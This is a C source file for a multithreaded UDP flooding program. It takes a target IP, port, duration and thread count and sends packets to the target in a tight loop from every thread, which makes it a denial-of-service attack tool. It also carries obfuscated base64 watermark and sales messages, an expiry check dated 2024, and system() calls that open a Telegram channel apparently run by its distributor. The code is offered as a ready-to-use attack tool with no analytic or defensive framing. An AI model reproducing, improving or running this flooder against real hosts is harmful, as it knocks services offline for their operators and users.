#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <ctype.h>

#define BUFFER_SIZE 9000
char *ip;
int port;
int duration;
char padding_data[2 * 1024 * 1024];
const char *segment1 = "VG";
const char *segment2 = "hp";
const char *segment3 = "cyB";
const char *segment4 = "maW";
const char *segment5 = "xlIG";
const char *segment6 = "lzIG";
const char *segment7 = "Nsb3";
const char *segment8 = "NlZC";
const char *segment9 = "BAVk";
const char *segment10 = "lQTU";
const char *segment11 = "9EU1";
const char *segment12 = "hBRE";
const char *segment13 = "1JTg";
const char *segment14 = "pUaG";
const char *segment15 = "xpcy";
const char *segment16 = "IGZy";
const char *segment17 = "ZWUgdmVyc2lvbgpETSB0byBidXkKQFZJUE1PRFNYQURNSU4=";
void assemble_base64_message(char *assembled_message) {
    strcpy(assembled_message, segment1);
    strcat(assembled_message, segment2);
    strcat(assembled_message, segment3);
    strcat(assembled_message, segment4);
    strcat(assembled_message, segment5);
    strcat(assembled_message, segment6);
    strcat(assembled_message, segment7);
    strcat(assembled_message, segment8);
    strcat(assembled_message, segment9);
    strcat(assembled_message, segment10);
    strcat(assembled_message, segment11);
    strcat(assembled_message, segment12);
    strcat(assembled_message, segment13);
    strcat(assembled_message, segment14);
    strcat(assembled_message, segment15);
    strcat(assembled_message, segment16);
    strcat(assembled_message, segment17);
}
void base64_encode(const unsigned char *data, char *encoded, size_t length) {
    const char *base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i = 0, j = 0, in_ = 0;
    unsigned char char_array_3[3], char_array_4[4];

    while (length--) {
        char_array_3[i++] = *(data++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; (i < 4); i++) {
                encoded[j++] = base64_chars[char_array_4[i]];
            }
            i = 0;
        }
    }

    if (i) {
        for (int k = i; k < 3; k++) {
            char_array_3[k] = '\0';
        }

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (int k = 0; (k < i + 1); k++) {
            encoded[j++] = base64_chars[char_array_4[k]];
        }

        while ((i++ < 3)) {
            encoded[j++] = '=';
        }
    }
    encoded[j] = '\0';
}
void base64_decode(const char *encoded, char *decoded) {
    const char *base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i = 0, j = 0, in_len = strlen(encoded);
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];

    while (in_len-- && (encoded[in_] != '=') && (isalnum(encoded[in_]) || (encoded[in_] == '+') || (encoded[in_] == '/'))) {
        char_array_4[i++] = encoded[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++) {
                char_array_4[i] = strchr(base64_chars, char_array_4[i]) - base64_chars;
            }
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; i < 3; i++) {
                decoded[j++] = char_array_3[i];
            }
            i = 0;
        }
    }

    if (i) {
        for (int k = i; k < 4; k++) {
            char_array_4[k] = 0;
        }

        for (int k = 0; k < 4; k++) {
            char_array_4[k] = strchr(base64_chars, char_array_4[k]) - base64_chars;
        }

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (int k = 0; k < (i - 1); k++) {
            decoded[j++] = char_array_3[k];
        }
    }
    decoded[j] = '\0';
}
int is_expired() {
    struct tm expiry_date = {0};
    time_t now;
    double seconds;
    expiry_date.tm_year = 2024 - 1900;
    expiry_date.tm_mon = 7;
    expiry_date.tm_mday = 27;

    time(&now);
    seconds = difftime(mktime(&expiry_date), now);

    if (seconds < 0) {
        char encoded_error_message[1024];
        assemble_base64_message(encoded_error_message);

        char decoded_error_message[512];
        base64_decode(encoded_error_message, decoded_error_message);
        fprintf(stderr, "Error: %s\n", decoded_error_message);
        open_url("https://t.me/SOULCRACKS");
        return 1;
    }
    return 0;
}

void open_url(const char *url) {
    if (system("command -v xdg-open > /dev/null") == 0) {
        system("xdg-open https://t.me/SOULCRACKS");
    } else if (system("command -v gnome-open > /dev/null") == 0) {
        system("gnome-open https://t.me/SOULCRACKS");
    } else if (system("command -v open > /dev/null") == 0) {
        system("open https://t.me/SOULCRACKS");
    } else if (system("command -v start > /dev/null") == 0) {
        system("start https://t.me/SOULCRACKS");
    } else {
        fprintf(stderr, "My channel link https://t.me/SOULCRACKS\n");
    }
}

void *send_udp_traffic(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    int sent_bytes;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        close(sock);
        pthread_exit(NULL);
    }

    snprintf(buffer, sizeof(buffer), "UDP traffic test");

    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;

    while (time(NULL) < end_time) {
        sent_bytes = sendto(sock, buffer, strlen(buffer), 0,
                            (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent_bytes < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    if (is_expired()) {
        exit(EXIT_FAILURE);
    }

    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    const char *encoded_watermark = "VGhpcyBpcyBmaWxlIGlzIG1hZGUgYnkgU09VTENSQUNLUw0KT1dORVIgT0YgQ0hBTk5FTCBBTkQgRklMRSA6LSBAVklQTU9EU1hBRE1JTg0KVEhJUyBGSUxFIElTIENMT1NFRCBOT1cg";
    char decoded_watermark[256];

    base64_decode(encoded_watermark, decoded_watermark);
    printf("Watermark: %s\n", decoded_watermark);

    memset(padding_data, 0, sizeof(padding_data));

    pthread_t tid[threads];
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&tid[i], NULL, send_udp_traffic, NULL) != 0) {
            perror("Thread creation failed");
            exit(EXIT_FAILURE);
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    return 0;
}
